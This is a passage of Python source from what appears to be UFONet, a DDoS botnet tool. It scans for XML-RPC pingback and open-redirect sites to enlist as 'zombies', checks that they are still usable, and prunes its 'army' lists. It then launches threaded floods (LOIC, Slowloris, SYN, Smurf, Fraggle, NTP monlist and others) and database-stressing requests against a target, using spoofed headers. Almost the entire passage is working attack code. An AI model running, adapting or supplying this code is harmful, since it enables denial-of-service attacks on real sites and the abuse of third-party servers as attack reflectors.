                        self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
            f.close()

    def search_rpc(self, rpc_host):
        options = self.options
        rpc_vulnerable = False
        rpc_pingback_url = False
        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
        headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
        try:
            if self.options.testall: # testing_all
                if options.proxy: # set proxy
                    self.proxy_transport(options.proxy)
                req = urllib.request.Request(rpc_host, None, headers)
                rpc_code = urllib.request.urlopen(req, context=self.ctx).read().decode('utf-8')
                rpc_links = re.findall('"((http|ftp)s?://.*?)"', rpc_code)
                for link in rpc_links:
                    if 'xmlrpc.php' in link[0] and not "rsd" in link[0]: # extract rpc server url (discarding 'rsd' url)
                        rpc_pingback_url = link[0]
                        rpc_vulnerable = True
                        break # found it!
                    else: # not any XML-RPC discovering methods are working
                        rpc_pingback_url = rpc_host + "/xmlrpc.php"
                        rpc_vulnerable = False
            else:
                if rpc_host.startswith("http://"):
                    rpc_host = rpc_host.replace("http://", "")
                if rpc_host.startswith("https://"):
                    rpc_host = rpc_host.replace("https://", "")
                rpc_host = urlparse(rpc_host)
                rpc_path = rpc_host.path.replace("\r", "")
                self.head = True # send HTTP HEAD request searching for: X-Pingback
                reply = self.connect_zombie(rpc_path)
                self.head = False
                if "X-Pingback" in reply: # discovering pingback-enabled resources
                    m = re.search('X-Pingback: (.+?)\n', reply) # regex magics
                    rpc_pingback_url = m.group(1) # extract rpc server url
                    rpc_vulnerable = True
                else: # not X-Pingback on HTTP Headers (search for <link rel="pingback"... on HTML/XHTML code)
                    if options.proxy: # set proxy
                        self.proxy_transport(options.proxy)
                    req_rpc = urllib.request.Request(rpc_host, None, headers)
                    req_rpc.get_method = lambda : 'GET'
                    rpc_code = urllib.request.urlopen(req_rpc, context=self.ctx).read().decode('utf-8')
                    rpc_links = re.findall('"((http|ftp)s?://.*?)"', rpc_code)
                    for link in rpc_links:
                        if 'xmlrpc.php' in link[0] and not "rsd" in link[0]: # extract rpc server url (discarding 'rsd' url)
                            rpc_pingback_url = link[0]
                            rpc_vulnerable = True
                            break # found it!
                        else: # not any XML-RPC discovering methods are working
                            rpc_pingback_url = rpc_host + "/xmlrpc.php"
                            rpc_vulnerable = False
        except: # something wrong discovering XML-RPC Pingback
            pass
        return rpc_vulnerable, rpc_pingback_url

    def testing_offline(self):
        # check for zombies offline
        print ("\n[Info] [AI] Checking (sending HTTP HEAD requests) for [Zombies] offline...\n")
        print('='*35)
        zombies_online = 0
        zombies_offline = 0
        zombies = self.extract_zombies()
        rpcs = self.extract_rpcs()
        aliens = self.extract_aliens()
        droids = self.extract_droids()
        ucavs = self.extract_ucavs()
        try:
            botnet = zombies + rpcs + aliens + droids + ucavs
        except:
            return
        discarded = [] # for discarded zombies
        if not botnet:
            return
        self.head = True
        for zombie in botnet:
            zombie = str(zombie)
            if zombie in zombies: # set zombie type (this way because cannot be same zombie with different type)
                zombie_type = 'Zombie'
            elif zombie in rpcs:
                zombie_type = 'XML-RPC'
            elif zombie in aliens:
                zombie_type = 'Alien'
            elif zombie in droids:
                zombie_type = 'Droid'
            elif zombie in ucavs:
                zombie_type = 'UCAV'
            t = urlparse(zombie)
            name_zombie = t.netloc
            if name_zombie == "":
                name_zombie = zombie
            if zombie_type == 'Alien': # [Aliens] are made with keyword ;$POST;
                sep = ';$POST;'
                zombie = zombie.split(sep, 1)[0]
            try:
                reply = str(self.connect_zombie(zombie))
            except:
                reply = None
            if reply:
                if reply == "200" or reply == "301" or reply == "302":
                    status = "ONLINE! -> [OK!]"
                else:
                    status = "ONLINE! -> [BUT replying an INVALID HTTP CODE]"
                zombies_online = zombies_online + 1
            else:
                status = "NOT Working!"
                zombies_offline = zombies_offline + 1
            print("\nName:", name_zombie)
            print("Type: [", zombie_type, "]")
            print("Vector:", zombie)
            print("HTTP Code: [", reply, "]")
            print("STATUS:", status)
            print('-'*21)
            if status == "NOT Working!": # add to discarded zombies
                if zombie not in discarded:
                    discarded.append(zombie)
        print("\n" + '='*52)
        print("\n+ Total Botnet:", len(botnet))
        print("\n" + '-'*25 + "\n")
        print("  - ONLINE:", zombies_online)
        print("  - OFFLINE:", zombies_offline, "\n")
        print('='*52 + '\n')
        self.head = False
        if zombies_offline > 0:
            if not self.options.forceyes:
                test_reply = input("[AI] Do you want to update your army? (Y/n)\n")
                print('-'*25 + "\n")
            else:
                test_reply = "Y"
            if test_reply == "n" or test_reply == "N":
                print("[AI] "+self.exit_msg+"\n")
                return
            else:
                disc_zombies = self.discard_zombies(discarded) # discard zombies (remove from files)
                print('='*52)
                print("\n  - DISCARDED:", disc_zombies)
                new_botnet = int(len(botnet) - disc_zombies)
                print("\n+ New Total Botnet:", str(new_botnet), "\n")
                print('='*52 + '\n')
        else:
            print("[Info] [AI] [Control] ALL checked [Zombies] are ONLINE! -> [Exiting!]\n")

    def send_extra_zombies(self):
        # check for extra zombies: aliens, droids, rpcs, ucavs... and start attacking with them
        if not self.options.disablealiens and not self.options.attackme: # different layers requests -> pure web abuse
            if self.options.verbose:
                print("[Info] [AI] [Control] Deploying [Aliens] with heavy 'laser-cannon' weapons...")
            aliens = [self.extract_aliens()] # extract aliens from file to a list
            for a in aliens:
                if a is None:
                    self.options.disablealiens = True
                    self.total_aliens = 0 # not any alien invoked
                else:
                    for s in a: # extract number of aliens
                        self.total_aliens = self.total_aliens + 1
            al = threading.Thread(target=self.send_aliens, args=(aliens)) # multithreading to send aliens
            al.start()
        else:
            self.options.disablealiens = True
            self.total_aliens = 0 # not any alien invoked
        if not self.options.disabledroids and not self.options.attackme: # GET (with parameter required) requests
            if self.options.verbose:
                print("[Info] [AI] [Control] Deploying [Droids] with light 'laser-cannon' weapons...")
            droids = [self.extract_droids()] # extract droids from file to a list
            for d in droids:
                if d is None:
                    self.options.disabledroids = True
                    self.total_droids = 0 # not any droid invoked
                else:
                    for s in d: # extract number of droids
                        self.total_droids = self.total_droids + 1
            dr = threading.Thread(target=self.send_droids, args=(droids)) # multithreading to send droids
            dr.start()
        else:
            self.options.disabledroids = True
            self.total_droids = 0 # not any droid invoked
        if not self.options.disablerpcs and not self.options.attackme: # exploit XML-RPC pingback vulnerability
            if self.options.verbose:
                print("[Info] [AI] [Control] Deploying [X-RPCs] with 'plasma cannon' weapons...")
            rpcs = [self.extract_rpcs()] # extract rpcs from file to a list
            for r in rpcs:
                if r is None:
                    self.options.disablerpcs = True
                    self.total_rpcs = 0 # not any rpc invoked
                else:
                    for s in r: # extract number of rpcs
                        self.total_rpcs = self.total_rpcs + 1
            rp = threading.Thread(target=self.send_rpcs, args=(rpcs)) # multithreading to send rpcs
            rp.start()
        else:
            self.options.disablerpcs = True
            self.total_rpcs = 0 # not any rpcs invoked
        if not self.options.disableucavs and not self.options.attackme: # perform an external 'Is target up?' round check
            if self.options.verbose:
                print("[Info] [AI] [Control] Deploying [UCAVs] with 'heat-beam' weapons and 'status check' scanners...") 
            ucavs = [self.extract_ucavs()] # extract ucavs from file to a list
            for u in ucavs:
                if u is None:
                    self.options.disableucavs = True
                    self.total_ucavs = 0 # not any ucav invoked
                else:
                    for s in u: # extract number of ucavs
                        self.total_ucavs = self.total_ucavs + 1
            uc = threading.Thread(target=self.send_ucavs, args=(ucavs)) # multithreading to send ucavs
            uc.start()
        else:
            self.options.disableucavs = True
            self.total_ucavs = 0 # not any ucavs invoked

    def abandoning_zombies(self):
        if self.options.expire: # set timing for purge
            try:
                timing = int(self.options.expire)
            except:
                timing = self.expire_timing # default timing for purge
        else:
            timing = self.expire_timing # default timing for purge
        if timing < 1:
            timing = self.expire_timing # default timing for purge
        zombies_arrival_timing = timing # timing = trying to control round time for threading flow
        zombies_lock = 0
        if self.options.verbose:
            print("[Info] [AI] [Control] Setting ["+str(zombies_arrival_timing)+"] per round for [Zombies] to return...")
        while self.herd.no_more_zombies() == False: # abandoning -controller- zombies
            zombies_lock = zombies_lock + 1
            if zombies_lock > zombies_arrival_timing: # execute main abandoning routine!
                if self.options.verbose:
                    print("\n[Info] [AI] [Control] Return time set [~"+str(zombies_arrival_timing)+"] for [Zombies] is over! -> [Expiring!]")
                break
            else:
                time.sleep(1)

    def discard_zombies(self, discarded):
        disc_zombies = 0
        if self.options.testoffline:
            zombies_list = [self.zombies_file, self.aliens_file, self.droids_file, self.ucavs_file, self.rpcs_file]
        else:
            zombies_list = [self.zombies_file]
            if not self.options.disablealiens: # add aliens
                zombies_list.append(self.aliens_file)
            if not self.options.disabledroids: # add droids
                zombies_list.append(self.droids_file)
            if not self.options.disablerpcs: # add rpcs
                zombies_list.append(self.rpcs_file)
            if not self.options.disableucavs: # add ucavs
                zombies_list.append(self.ucavs_file)
        for l in zombies_list:
            f = open(l, "r+")
            d = f.readlines()
            f.close()
            f = open(l, "w")
            disc_zombies = self.remove_discarded_zombies(f, d, discarded, disc_zombies)
            f.close()
        return disc_zombies

    def remove_discarded_zombies(self, f, d, discarded, disc_zombies):
        m = []
        for zombie in d:
           if zombie not in discarded == True:
               m.append(zombie) # save it
           else:
               disc_zombies = disc_zombies + 1
        if not m:
            f.write("")
        else:
            for z in m:
                f.write(z+os.linesep)
        return disc_zombies

    def parse_url_encoding(self, target):
        t = urlparse(target)
        host = urllib.parse.quote(t.netloc.encode('utf-8'))
        path = urllib.parse.quote(t.path.encode('utf-8'))
        query = urllib.parse.quote(t.query.encode('utf-8'))
        if query:
            if path.endswith(""):
                path.replace("", "/")
            query = urllib.parse.quote(t.query.encode('utf-8'))
            target = t.scheme+"://"+host + path + "?" + query
        else:
            target = t.scheme+"://"+host + path
        return target

    def testing_rpcs(self, rpcs):
        # discover/test XML-RPC Pingback vulnerabilities on webapps (Wordpress, Drupal, PostNuke, b2evolution, 
        # Xoops, PHPGroupWare, TikiWiki, etc...) and update list
        options = self.options
        if self.options.testall: #testing_all
            print('='*51)
        print ("Are 'plasma' reflectors ready? :-) (XML-RPC 'Pingback' Vulnerability Check):")
        print('='*51)
        num_active_rpcs = 0
        num_failed_rpcs = 0
        rpcs_ready = []
        print("Trying:", len(rpcs))
        print('-'*21)
        for rpc in rpcs:
            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            if rpc.startswith("http://") or rpc.startswith("https://"):
                print("[Info] [X-RPCs] Exploiting 'X-Pingback' at:", rpc)
                rpc_host = rpc.replace("/xmlrpc.php", "")
                rpc_vulnerable, rpc_pingback_url = self.search_rpc(rpc_host)
                if rpc_vulnerable == True: # discover XML-RPC system.listMethods allowed
                    rpc_methods = "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
                    try:
                        if options.proxy: # set proxy
                            self.proxy_transport(options.proxy)
                        try:
                            req = urllib.request.Request(rpc_pingback_url, rpc_methods.encode('utf-8'), headers)
                            target_reply = urllib.request.urlopen(req, context=self.ctx).read().decode('utf-8')
                        except:
                            if DEBUG == True:
                                traceback.print_exc()
                        if self.options.verbose:
                            print("[Info] [X-RPCs] Reply:", target_reply)
                        if "pingback.ping" in target_reply: # XML-RPC pingback.ping method is allowed!
                            print("[Info] [AI] -> [VULNERABLE!]")
                            rpcs_ready.append(rpc_pingback_url) # save XML-RPC path as RPC zombie
                            num_active_rpcs = num_active_rpcs + 1 # add fail to rpcs stats
                        else:
                            print("[Info] [AI] -> [NOT vulnerable...]")
                            num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
                    except:
                        print("[Info] [AI] -> [NOT vulnerable...]")
                        num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
                else:
                    print("[Info] [AI] -> [NOT vulnerable...]")
                    num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
            print('-'*21)
        print('='*18)
        print("OK:", num_active_rpcs, "Fail:", num_failed_rpcs)
        print('='*18)
        if self.options.testall: # testing_all
            return rpcs_ready, num_active_rpcs, num_failed_rpcs
        else:
            # update 'rpcs' list
            if num_active_rpcs == 0:
                print("\n[Info] [X-RPCs] Not any vulnerable 'XML-RPC' active!\n")
                return
            else:
                if not self.options.forceyes:
                    update_reply = input("[AI] Do you want to update your army? (Y/n)")
                    print('-'*25)
                else:
                    update_reply = "Y"
                if update_reply == "n" or update_reply == "N":
                    print("[AI] "+self.exit_msg+"\n")
                    return
                else:
                    self.update_rpcs(rpcs_ready)
                    if not self.options.upload:
                        print("\n[Info] [AI] Botnet updated! -> ;-)\n")

    def testing(self, zombies):
        # test Open Redirect exploiting and show statistics
        # HTTP HEAD check
        army = 0
        print ("Are 'they' alive? :-) (HEAD Check):")
        print('='*35)
        num_active_zombies = 0
        num_failed_zombies = 0
        active_zombies = []
        print("Trying:", len(zombies))
        print('-'*21)
        for zombie in zombies:
            zombie = str(zombie)
            if zombie.startswith("http://") or zombie.startswith("https://"):
                # send HEAD connection
                self.head = True
                try:
                    self.connect_zombies(zombie)
                except:
                    pass
        while self.herd.no_more_zombies() == False:
            time.sleep(1)
        for zombie in self.herd.done:
            zombie = str(zombie)
            t = urlparse(zombie)
            if self.herd.get_result(zombie):
                code_reply = self.herd.get_result(zombie)
                self.head = False
                if code_reply == "200" or code_reply == "302" or code_reply == "301": # HEAD check pass!
                    name_zombie = t.netloc
                    if name_zombie == "":
                        name_zombie = zombie
                    print("Zombie:", name_zombie)
                    print("Status: OK ["+ code_reply + "]")
                    num_active_zombies = num_active_zombies + 1
                    active_zombies.append(zombie)
                elif code_reply == "401":
                    print("Zombie:", t.netloc)
                    print("Status: Unauthorized ["+ code_reply + "]")
                    num_failed_zombies = num_failed_zombies + 1
                elif code_reply == "403":
                    print("Zombie:", t.netloc)
                    print("Status: Error Forbidden ["+ code_reply + "]")
                    num_failed_zombies = num_failed_zombies + 1
                elif code_reply == "404":
                    print("Zombie:", t.netloc)
                    print("Status: Not Found ["+ code_reply + "]")
                    num_failed_zombies = num_failed_zombies + 1
                elif code_reply == "500":
                    print("Zombie:", t.netloc)
                    print("Status: Internal Server Error ["+ code_reply + "]")
                    num_failed_zombies = num_failed_zombies + 1
                else:
                    print("Zombie:", t.netloc, "\nVector:", zombie)
                    print("Status: Not Allowed ["+ code_reply + "]")
                    num_failed_zombies = num_failed_zombies + 1
            else:
                if self.options.verbose:
                    print("[Info] [Zombies] Reply:", "\n\nNothing!!!!!\n")
                print("Zombie:", zombie)
                print("Status: Malformed!")
                num_failed_zombies = num_failed_zombies + 1
            print('-'*10)
        self.herd.reset()
        print('='*18)
        print("OK:", num_active_zombies, "Fail:", num_failed_zombies)
        print('='*18 + "\n")
        print('='*22)
        if num_active_zombies > 0:
            # check url parameter vectors
            print ("Checking for payloads:")
            print('='*22)
            print("Trying:", num_active_zombies)
            print('-'*21)
            zombies_ready = []
            num_waiting_zombies = 0
            if num_active_zombies == 0:
                num_disconnected_zombies = num_failed_zombies
            else:
                num_disconnected_zombies = 0
            for zombie in active_zombies:
                zombie = str(zombie)
                t = urlparse(zombie)
                name_zombie = t.netloc
                if name_zombie == "":
                    name_zombie = zombie
                self.payload = True
                try:
                    self.connect_zombies(zombie)
                except:
                    pass
                self.payload = False
            while self.herd.no_more_zombies() == False:
                time.sleep(1)
            for zombie in self.herd.done:
                zombie = str(zombie)
                t = urlparse(zombie)
                name_zombie = t.netloc
                if name_zombie == "":
                    name_zombie = zombie
                payload_zombie = zombie
                payload_reply = ""
                print("Vector:", payload_zombie)
                self.payload = True
                if self.herd.get_result(zombie):
                    payload_reply = self.herd.get_result(zombie)
                self.payload = False
                if "https://www.whitehouse.gov" in payload_reply: #Open Redirect reply [requested by all UFONet motherships ;-)]
                    num_waiting_zombies = num_waiting_zombies + 1
                    print("Status:", "Waiting for orders... ;-)")
                    zombies_ready.append(zombie)
                else:
                    num_disconnected_zombies = num_disconnected_zombies + 1
                    print("Status:", "Not ready...")
                army = army + 1
                print('-'*10)
            self.herd.reset()
            print('='*18)
            print("OK:", num_waiting_zombies, "Fail:", num_disconnected_zombies)
            print('='*18 + "\n")
            # list of [Zombies] ready to attack
            num_active_zombie = 0
            for z in zombies_ready:
                t = urlparse(z)
                name_zombie = t.netloc
                if name_zombie == "":
                    name_zombie = z
                num_active_zombie = num_active_zombie + 1
                if self.options.verbose:
                    print("Zombie [", num_active_zombie, "]:", name_zombie + "\n")
            if self.options.testall: # testing_all
                return zombies_ready, num_waiting_zombies, num_disconnected_zombies + num_failed_zombies
            else:
                print('-'*25 + "\n")
                print('='*24)
                print("Working [Zombies]:", num_active_zombie)
                print('='*24)
                if not self.options.forceyes:
                    update_reply = input("\n[AI] Do you want to update your army? (Y/n)")
                    print('-'*25)
                else:
                    update_reply = "Y"
                if update_reply == "n" or update_reply == "N":
                    print("[AI] "+self.exit_msg+"\n")
                    return 
                else:
                    self.update_zombies(zombies_ready)
                    if not self.options.upload:
                        print("\n[Info] [AI] Botnet updated! -> ;-)\n")
                        self.update_scanner_stats(self.scanned_zombies) # update json file with scanner stats (found via dorking)
        else:
            print('-'*25 + "\n")
            print('='*24)
            print("Working [Zombies]:", num_active_zombies)
            print('='*24)
            print("\n[Info] [AI] [Zombies] aren't replying to your HTTP HEAD requests! -> [Exiting!]\n")

    def testing_all(self):
        # test whole botnet
        print ("\nChecking if [Zombies] are still infected (WARNING: this may take serveral time!)\n")
        print('='*35)
        zombies = self.extract_zombies()
        rpcs = self.extract_rpcs()
        aliens = self.extract_aliens()
        droids = self.extract_droids()
        ucavs = self.extract_ucavs()
        try:
            botnet = zombies + rpcs + aliens + droids + ucavs
            tested_zombies = zombies + rpcs # test types supported: zombies + xml-rpcs
        except:
            return
        zombies_ready, num_waiting_zombies, num_disconnected_zombies = self.testing(zombies)
        rpcs_ready, num_active_rpcs, num_failed_rpcs = self.testing_rpcs(rpcs)
        print("\n" + '='*52)
        print("\n+ Total Botnet:", len(botnet))
        print("\n" + '-'*25)
        print("\n+ Total Tested:", len(tested_zombies))
        print("\n  - Zombies :", len(zombies), " [ OK:", str(num_waiting_zombies), "| FAILED:", str(num_disconnected_zombies), "]")
        print("  - XML-RPCs:", len(rpcs), " [ OK:", str(num_active_rpcs), "| FAILED:", str(num_failed_rpcs), "]" + "\n")
        print('='*52 + '\n')
        if num_disconnected_zombies > 0 or num_failed_rpcs > 0:
            if not self.options.forceyes:
                update_reply = input("[AI] Do you want update your army? (Y/n)")
                print('-'*25)
            else:
                update_reply = "Y"
            if update_reply == "n" or update_reply == "N":
                print("[AI] "+self.exit_msg+"\n")
                return
            else:
                if num_disconnected_zombies > 0:
                    self.update_zombies(zombies_ready)
                if num_failed_rpcs > 0:
                    self.update_rpcs(rpcs_ready)
                if not self.options.upload:
                    print("\n[Info] [AI] Botnet updated! -> ;-)\n")
        else:
            print("[Info] [AI] [Control] ALL tested [Zombies] are working! ;-) -> [Exiting!]\n")

    def attacking(self, zombies, target):
        # perform a DDoS Web attack using Open Redirect vectors (and other Web Abuse services) as [Zombies]
        if self.options.forcessl:
            if target.startswith("http://"):
                target = target.replace("http://", "https://") # force SSL/TLS 
        if target.startswith("http://") or target.startswith("https://"):
            print("Attacking:", target)
            print('='*55, "\n")
            # send Open Redirect injection (multiple zombies > one target url)
            reply = self.injection(target, zombies)
        else:
            print("\n[Error] [AI] Target not valid: "+target+" -> [Discarding!]\n")

    def aiming_extra_weapons(self, target, proxy, loic, loris, ufosyn, spray, smurf, fraggle, xmas, ufoack, uforst, droper, overlap, pinger, ufoudp, nuke, tachyon, monlist, sniper):
        # perform some other extra attacks (such as DoS techniques)
        time.sleep(2) # aiming (multi-threading flow time compensation)
        if loic:
            try:
                self.options.loic = int(loic)
            except:
                self.options.loic = 100 # default LOIC requests
            if self.options.loic < 1:
                self.options.loic = 100
            self.instance = LOIC() # instance main class for LOIC operations
            self.t1 = threading.Thread(target=self.instance.attacking, args=(target, self.options.loic, proxy)) # LOIC using threads + proxy
            self.t1.daemon = True # extra weapons are threaded as daemons
            self.t1.start()
            self.update_loic_stats() # add new LOIC attack to mothership stats
        if loris:
            try:
                self.options.loris = int(loris)
            except:
                self.options.loris = 101 # default LORIS requests (apache -> max_clients: ~100 | nginx -> no limit (other method))
            if self.options.loris < 1:
                self.options.loris = 101 
            self.instance = LORIS() # instance main class for LORIS operations
            self.t2 = threading.Thread(target=self.instance.attacking, args=(target, self.options.loris)) # LORIS using threads
            self.t2.daemon = True
            self.t2.start()
            self.update_loris_stats() # add new LORIS attack to mothership stats
        if ufosyn:
            try:
                self.options.ufosyn = int(ufosyn)
            except:
                self.options.ufosyn = 100 # default UFOSYN requests
            if self.options.ufosyn < 1:
                self.options.ufosyn = 100 
            self.instance = UFOSYN() # instance main class for UFOSYN operations
            self.t3 = threading.Thread(target=self.instance.attacking, args=(target, self.options.ufosyn)) # UFOSYN using threads
            self.t3.daemon = True
            self.t3.start()
            self.update_ufosyn_stats() # add new UFOSYN attack to mothership stats
        if spray:
            try:
                self.options.spray = int(spray)
            except:
                self.options.spray = 100 # default SPRAY requests
            if self.options.spray < 1:
                self.options.spray = 100
            self.instance = SPRAY() # instance main class for SPRAY operations
            self.t4 = threading.Thread(target=self.instance.attacking, args=(target, self.options.spray)) # SPRAY using threads
            self.t4.daemon = True
            self.t4.start()
            self.update_spray_stats() # add new SPRAY attack to mothership stats
        if smurf:
            try:
                self.options.smurf = int(smurf)
            except:
                self.options.smurf = 101 # default SMURF requests
            if self.options.smurf < 1:
                self.options.smurf = 101
            self.instance = SMURF() # instance main class for SMURF operations
            self.t5 = threading.Thread(target=self.instance.attacking, args=(target, self.options.smurf)) # SMURF using threads
            self.t5.daemon = True
            self.t5.start()
            self.update_smurf_stats() # add new SMURF attack to mothership stats
        if xmas:
            try:
                self.options.xmas = int(xmas)
            except:
                self.options.xmas = 101 # default XMAS requests
            if self.options.xmas < 1:
                self.options.xmas = 101
            self.instance = XMAS() # instance main class for XMAS operations
            self.t6 = threading.Thread(target=self.instance.attacking, args=(target, self.options.xmas)) # XMAS using threads
            self.t6.daemon = True
            self.t6.start()
            self.update_xmas_stats() # add new XMAS attack to mothership stats
        if nuke:
            if sys.platform == "linux" or sys.platform == "linux2":
                try:
                    self.options.nuke = int(nuke)
                except:
                    self.options.nuke = 10000 # default NUKE requests
                if self.options.nuke < 1:
                    self.options.nuke = 10000
                self.instance = NUKE() # instance main class for NUKE operations
                self.t7 = threading.Thread(target=self.instance.attacking, args=(target, self.options.nuke)) # NUKE using threads
                self.t7.daemon = True # extra weapons are threaded as daemons
                self.t7.start()
                self.update_nuke_stats() # add new NUKE attack to mothership stats
            else:
                print("\n[Info] [AI] Your OS cannot perform this attack... -> [Passing!]\n")
        if tachyon:
            try:
                self.options.tachyon = int(tachyon)
            except:
                self.options.tachyon = 1000 # default TACHYON requests
            if self.options.tachyon < 1:
                self.options.tachyon = 1000
            self.instance = TACHYON() # instance main class for TACHYON operations
            self.t8 = threading.Thread(target=self.instance.attacking, args=(target, self.options.tachyon)) # TACHYON using threads
            self.t8.daemon = True
            self.t8.start()
            self.update_tachyon_stats() # add new TACHYON attack to mothership stats
        if monlist:
            try:
                self.options.monlist = int(monlist)
            except:
                self.options.monlist = 1000 # default MONLIST requests
            if self.options.monlist < 1:
                self.options.monlist = 1000
            self.instance = MONLIST() # instance main class for MONLIST operations
            self.t9 = threading.Thread(target=self.instance.attacking, args=(target, self.options.monlist)) # MONLIST using threads
            self.t9.daemon = True
            self.t9.start()
            self.update_monlist_stats() # add new MONLIST attack to mothership stats
        if ufoack:
            try:
                self.options.ufoack = int(ufoack)
            except:
                self.options.ufoack = 101 # default UFOACK requests
            if self.options.ufoack < 1:
                self.options.ufoack = 101
            self.instance = UFOACK() # instance main class for UFOACK operations
            self.t10 = threading.Thread(target=self.instance.attacking, args=(target, self.options.ufoack)) # UFOACK using threads
            self.t10.daemon = True
            self.t10.start()
            self.update_ufoack_stats() # add new UFOACK attack to mothership stats
        if uforst:
            try:
                self.options.uforst = int(uforst)
            except:
                self.options.uforst = 101 # default UFORST requests
            if self.options.uforst < 1:
                self.options.uforst = 101
            self.instance = UFORST() # instance main class for UFORST operations
            self.t11 = threading.Thread(target=self.instance.attacking, args=(target, self.options.uforst)) # UFORST using threads
            self.t11.daemon = True
            self.t11.start()
            self.update_uforst_stats() # add new UFORST attack to mothership stats
        if droper:
            try:
                self.options.droper = int(droper)
            except:
                self.options.droper = 101 # default DROPER requests
            if self.options.droper < 1:
                self.options.droper = 101
            self.instance = DROPER() # instance main class for DROPER operations
            self.t12 = threading.Thread(target=self.instance.attacking, args=(target, self.options.droper)) # DROPER using threads
            self.t12.daemon = True
            self.t12.start()
            self.update_droper_stats() # add new DROPER attack to mothership stats
        if overlap:
            try:
                self.options.overlap = int(overlap)
            except:
                self.options.overlap = 101 # default OVERLAP requests
            if self.options.overlap < 1:
                self.options.overlap = 101
            self.instance = OVERLAP() # instance main class for OVERLAP operations
            self.t13 = threading.Thread(target=self.instance.attacking, args=(target, self.options.overlap)) # OVERLAP using threads
            self.t13.daemon = True
            self.t13.start()
            self.update_overlap_stats() # add new OVERLAP attack to mothership stats
        if pinger:
            try:
                self.options.pinger = int(pinger)
            except:
                self.options.pinger = 101 # default PINGER requests
            if self.options.pinger < 1:
                self.options.pinger = 101
            self.instance = PINGER() # instance main class for PINGER operations
            self.t14 = threading.Thread(target=self.instance.attacking, args=(target, self.options.pinger)) # PINGER using threads
            self.t14.daemon = True
            self.t14.start()
            self.update_pinger_stats() # add new PINGER attack to mothership stats
        if ufoudp:
            try:
                self.options.ufoudp = int(ufoudp)
            except:
                self.options.ufoudp = 101 # default UFOUDP requests
            if self.options.ufoudp < 1:
                self.options.ufoudp = 101
            self.instance = UFOUDP() # instance main class for UFOUDP operations
            self.t15 = threading.Thread(target=self.instance.attacking, args=(target, self.options.ufoudp)) # UFOUDP using threads
            self.t15.daemon = True
            self.t15.start()
            self.update_ufoudp_stats() # add new UFOUDP attack to mothership stats
        if fraggle:
            try:
                self.options.fraggle = int(fraggle)
            except:
                self.options.fraggle = 101 # default FRAGGLE requests
            if self.options.fraggle < 1:
                self.options.fraggle = 101
            self.instance = FRAGGLE() # instance main class for FRAGGLE operations
            self.t16 = threading.Thread(target=self.instance.attacking, args=(target, self.options.fraggle)) # FRAGGLE using threads
            self.t16.daemon = True
            self.t16.start()
            self.update_fraggle_stats() # add new FRAGGLE attack to mothership stats
        if sniper:
            try:
                self.options.sniper = int(sniper)
            except:
                self.options.sniper = 101 # default SNIPER requests
            if self.options.sniper < 1:
                self.options.sniper = 101
            self.instance = SNIPER() # instance main class for SNIPER operations
            self.t17 = threading.Thread(target=self.instance.attacking, args=(target, self.options.sniper)) # SNIPER using threads
            self.t17.daemon = True
            self.t17.start()
            self.update_sniper_stats() # add new SNIPER attack to mothership stats

    def stressing(self, target, zombie):
        # perform a DDoS Web attack against a target, requesting records on target's database
        options = self.options
        db_input = self.options.dbstress
        def random_key(length):
            key = ''
            for i in range(length):
                key += random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits)
            return key
        # generating random alphanumeric queries
        if self.db_flash > 9: # set db flash start on: 10
            length = 1024 # search a heavy random length query (db flash): 1024
            self.db_flash = 0 # reset db flash counter
        else:
            length = 1 # search for one different (alphanumeric) character each time will produces more positive results on db
        key = str(random_key(length))
        if self.db_flash > 9:
            print("[Info] [DBStress] Trying database request to: " + db_input + " | Query used: db flash! " + "(" + str(length) + " chars)")
        else:
            print("[Info] [DBStress] Trying database request to: " + db_input + " | Query used: " + key)
        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
        headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
        if not target.endswith('/'): # add "/" to end of target
            target = target + "/"
        url = zombie + target + db_input + key
        req = urllib.request.Request(url, None, headers)
        if options.proxy: # set proxy
            self.proxy_transport(options.proxy)
        try:
            req_reply = urllib.request.urlopen(req, context=self.ctx).read().decode('utf-8')
        except urllib.error.HTTPError as e:
            if e.code == 401:
                print('[Info] [DBStress] Not authorized')
            elif e.code == 404:
                print('[Info] [DBStress] Not found')
            elif e.code == 503:
                print('[Info] [DBStress] Service unavailable')
            else:
                print('[Info] [DBStress] Unknown error')
        else:
            print('[Info] [DBStress] Database query: HIT!')

    def attackme(self, zombies):
        # perform a DDoS Web attack against yourself
        print("[AI] Starting local port to listening at: " + self.port + "\n") 
        print('='*21 + "\n")
        self.doll=Doll(self)
        self.doll.start()
        while not self.doll._armed:
            time.sleep(1)
        # send Open Redirect injection (multiple zombies-multiple target urls)
        target = ""
        self.injection(target, zombies)
        self.doll.shutdown()
        self.doll.join()
        self.herd.list_fails()

    def check_target_status(self):
        if self.num_is_down > 0 and self.num_is_up == 0: # check for: 1 or more down, 0 up
            print("\n[Info] [AI] Congratulations!! -> [Target looks OFFLINE!]\n")
            if not self.options.forceyes:
                update_reply = input("[AI] Do you want to send a [HEAD] check request? (y/N)")
                print("\n" + '-'*25)
            else:
                update_reply = "N"
            if update_reply == "y" or update_reply == "Y":
                try: # send HEAD connection
                    self.head = True
                    reply = self.connect_zombie(target)
                    self.head = False
                    if reply:
                        print("\n[Info] [AI] [Control] Target has replied you! -> [Keep shooting!]\n")
                    else:
                        print("\n[Info] [AI] " + target + " -> [TANGO DOWN!!!]\n")
                        self.update_targets_crashed() # update targets crashed stats
                        self.update_mothership_stats() # update mothership completed attack stats
                except Exception:
                    print("\n[Error] [AI] Something wrong with your connection!...\n")
                    if DEBUG == True:
                        traceback.print_exc()
                return
            else:
                print("\n[Info] [AI] " + target + " -> [TANGO DOWN!!!]\n")
                self.update_targets_crashed() # update targets crashed stats
                self.update_mothership_stats() # update mothership completed attack stats
                return

    def starting_target_check(self, target, head_check):
        options = self.options
        head_check_here = False
        head_check_external = False
